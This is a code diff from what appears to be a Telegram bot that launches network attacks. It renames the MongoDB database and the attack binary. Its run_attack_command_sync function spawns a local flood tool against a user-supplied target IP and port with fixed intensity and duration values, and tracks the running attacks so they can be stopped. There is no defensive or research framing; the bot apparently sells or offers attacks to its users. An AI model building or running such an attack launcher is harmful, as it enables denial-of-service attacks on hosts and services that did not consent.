@@ -10,7 +10,7 @@ logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s
 
 
 client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
-db = client['lite']
+db = client['Sushil']
 users_collection = db.users
 bot = telebot.TeleBot(TOKEN)
 blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
@@ -41,7 +41,7 @@ def uniq_value():
 def run_attack_command_sync(user_id, target_ip, target_port, action):
     try:
         if action == 1:
-            process = subprocess.Popen(["./lite", target_ip, str(target_port), "2400", "60"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            process = subprocess.Popen(["./sushil", target_ip, str(target_port), "2400", "60"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             active_attacks[(user_id, target_ip, target_port)] = process.pid
         elif action == 2:
             pid = active_attacks.pop((user_id, target_ip, target_port), None)
